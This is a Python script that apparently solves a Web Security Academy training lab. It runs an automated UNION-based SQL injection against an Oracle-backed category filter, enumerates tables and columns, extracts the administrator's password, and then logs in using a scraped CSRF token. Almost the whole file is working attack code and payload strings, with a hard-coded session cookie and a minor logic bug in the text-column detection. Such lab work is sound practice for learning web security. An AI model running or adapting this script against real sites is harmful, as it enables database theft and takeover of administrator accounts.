import requests
import json
import urllib
from bs4 import BeautifulSoup


#modify here ---------
baseURL = "https://0aeb001c03d2b2b1c0431d39003e00b1.web-security-academy.net"
cookies = {'session':'WwADV3A5XwXmlIGAFsY21yjFO1DXSJku'}
MAX_TRIES = 5
#modify end ----------

# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
exploitURL = baseURL + "/filter?category="
loginURL = baseURL + "/login"

found = False;
col_index = 0  # counter for no. of columns


#--(1) detect columns--------------------------------------------------
print("Detecting no of columns with union attack...")

while(found == False):
	if col_index == MAX_TRIES:
		break
	payload = "' union select {}null from dual--".format(col_index*'null,')
	res = requests.get(url = exploitURL+payload)
	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	if (res.status_code == 200):
		found = True
		break
	else:
		col_index=col_index+1


col_count = col_index+1
print(" [+] Found! Total columns detected = {}\n".format(col_count))

#--(2) detect column with text--------------------------------------------------
print("2 Detecting column with text")
found = False
colText = 0 # counter for which column is string type

for index in range(col_count):
	array = ['null'] * col_count
	array[index] = "'TEXT'"
	stringWithComma = ",".join(array) 
	payload = "' union select {} from dual--".format(stringWithComma)

	res = requests.get(url = exploitURL+payload)
	# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
	if res.status_code == 200:	
		print(" [+] Found! column index {} is a string type".format(index))
		break
		colText = index


#--(3) Query for tables from all_tables--------------------------------------------------

print("\n3 Querying users_xxxx table name")
print("looking for users table..")
#'+union+select+table_name,null+from+information_schema.tables-- 


array = ['null'] * col_count
array[colText] = "table_name"
stringWithComma = ",".join(array)
payload = "' union select {} from all_tables--".format(stringWithComma)
print('payload: {}'.format(payload))
html_content = requests.get(url = exploitURL+payload).text
# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)

userTablename = ""
soup = BeautifulSoup(html_content, "html.parser")
table = soup.find('table', class_='is-table-longdescription')
for row in table.tbody.find_all('tr'):
	headers = str(row.find_all('th'))
	if 'USERS_' in headers:
		userTablename = row.find('th').text.strip()
		if (userTablename.startswith("USERS_")):
			print(" [+] userTablename: {}".format(userTablename))
			break


#--(4) Query for column names from all_tab_columns--------------------------------------------------
# ' union select column_name,null from all_tab_columns.columns where table_name='users_wkaamd'--
print("\nLooking for column names in table '{}'..".format(userTablename))
array[colText] = "column_name"
stringWithComma = ",".join(array)
payload = "' union select {} from all_tab_columns where table_name='{}'--".format(stringWithComma,userTablename)
print('payload: {}'.format(payload))


userColumnName = ""
passColumnName = ""

html_content = requests.get(url = exploitURL+payload).text
# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
soup = BeautifulSoup(html_content, "html.parser")
table = soup.find('table', class_='is-table-longdescription')
for row in table.tbody.find_all('tr'):
	headers = str(row.find_all('th'))
	if 'USERNAME_' in headers:
		userColumnName = row.find('th').text.strip()
		print(" [+] Found column for username! : {}".format(userColumnName))
	if 'PASSWORD_' in headers:
		passColumnName = row.find('th').text.strip()
		print(" [+] Found column for password! : {}".format(passColumnName))

#--(5) Query for adminstrator password from user table--------------------------------------------------
# ' union select password_lbbjks,null from users_wkaamd where username_nemtbx='administrator'--
print("\nLooking for administrator password in table '{}'..".format(userTablename))
array[colText] = passColumnName
stringWithComma = ",".join(array)
payload = "' union select {} from {} where {}='administrator'--".format(stringWithComma,userTablename, userColumnName)
print('payload: {}'.format(payload))

html_content = requests.get(url = exploitURL+payload).text
# res = requests.get(url = exploitURL+payload, proxies=proxies, verify=False)
soup = BeautifulSoup(html_content, "html.parser")
table = soup.find('table', class_='is-table-longdescription')

password = ""

for row in table.tbody.find_all('tr'):
	headers = str(row.find_all('th'))
	password = row.find('th').text.strip()
	print(" [+] Found administrator password! : {}".format(password))
	
#--(6) login with found credentials--------------------------------------------------
print("\nAttempt to login with credentials...")
print("finding csrf token... ")
html_content = requests.get(url = loginURL, cookies=cookies).text
soup = BeautifulSoup(html_content, "html.parser")
csrf_token = soup.find('input', {'name':'csrf'})['value']
print(" [+] csrf token found! : {}".format(csrf_token))

print("\nLoggin in... ")

# data body
# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
data = "csrf={}&username={}&password={}".format(csrf_token,"administrator",password)

res = requests.post(url = loginURL, data = data, cookies=cookies)

#if login is successful you will see 'Log out' 
if "Log out" in res.text:
	print(" [+] Successfully logged in!")


